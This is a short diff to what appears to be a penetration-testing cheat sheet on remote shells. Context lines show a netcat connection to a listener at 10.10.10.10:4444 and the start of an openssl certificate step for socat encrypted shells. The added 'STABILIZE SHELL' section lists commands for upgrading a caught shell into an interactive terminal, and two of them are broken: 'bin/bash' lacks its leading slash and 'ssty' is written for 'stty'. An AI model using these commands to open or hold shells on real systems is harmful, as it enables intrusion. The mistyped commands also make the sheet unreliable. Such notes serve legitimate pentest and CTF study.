@@ -25,6 +25,16 @@ nc <target-ip> <port-number>
 nc 10.10.10.10 4444
 ```
 
+**STABILIZE SHELL**. 
+```
+python -c 'import pty;pty.spawn("bin/bash")'
+export TERM=xterm
+`Ctrl + z` 
+ssty raw -echo; fg
+```
+
+
+
 ## SOCAT ENCRYPTED SHELLS
 ```
 openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt 
